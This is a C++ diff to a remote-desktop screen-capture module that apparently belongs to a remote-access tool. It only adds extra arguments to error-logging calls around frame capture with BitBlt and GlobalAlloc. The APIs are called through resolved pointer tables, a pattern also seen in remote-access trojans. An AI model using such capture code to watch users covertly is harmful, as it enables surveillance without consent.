@@ -322,7 +322,7 @@ GpBitmap* mod_RemoteDesktop::getFrameBitmap(ULONG quality, int monitor_index) {
     HGLOBAL hGlobalMem = this->KERNEL32.pGlobalAlloc(GHND | GMEM_DDESHARE, 0);
 
     if (hGlobalMem == NULL) {
-        error_2("[RD][X] getFrameBitmap GlobalAlloc error");
+        error_2("[RD][X] getFrameBitmap GlobalAlloc error", hGlobalMem);
         goto EndSec;
     }
 
@@ -350,7 +350,7 @@ GpBitmap* mod_RemoteDesktop::getFrameBitmap(ULONG quality, int monitor_index) {
     
     //Copiar los bits al bitmap   hmpScreen
     if (!this->GDI32.pBitBlt(hdcMemDC, 0, 0, monitor.rectData.resWidth, monitor.rectData.resHeight, hdcMonitor, monitor.rectData.xStart, monitor.rectData.yStart, SRCCOPY)) {
-        error_2("[RD][X] getFrameBitmap bitblt failed");
+        error_2("[RD][X] getFrameBitmap bitblt failed", -1);
         goto EndSec;
     }
 
@@ -374,7 +374,7 @@ GpBitmap* mod_RemoteDesktop::getFrameBitmap(ULONG quality, int monitor_index) {
 
     hr = this->OLE32.pCreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
     if (hr != S_OK) {
-        error_2("[RD][X] getFrameBitmap CreateStreamOnHGlobal error");
+        error_2("[RD][X] getFrameBitmap CreateStreamOnHGlobal error", hr);
         goto EndSec;
     }
 
@@ -452,7 +452,7 @@ std::vector<char> mod_RemoteDesktop::getBitmapBytes(GpBitmap*& _in, ULONG _quali
     HGLOBAL hGlobalMem = GlobalAlloc(GHND | GMEM_DDESHARE, 0);
 
     if (hGlobalMem == NULL) {
-        error_2("[RD][X] getBitmapBytes GlobalAlloc error");
+        error_2("[RD][X] getBitmapBytes GlobalAlloc error", -1);
         goto EndSec;
     }
 
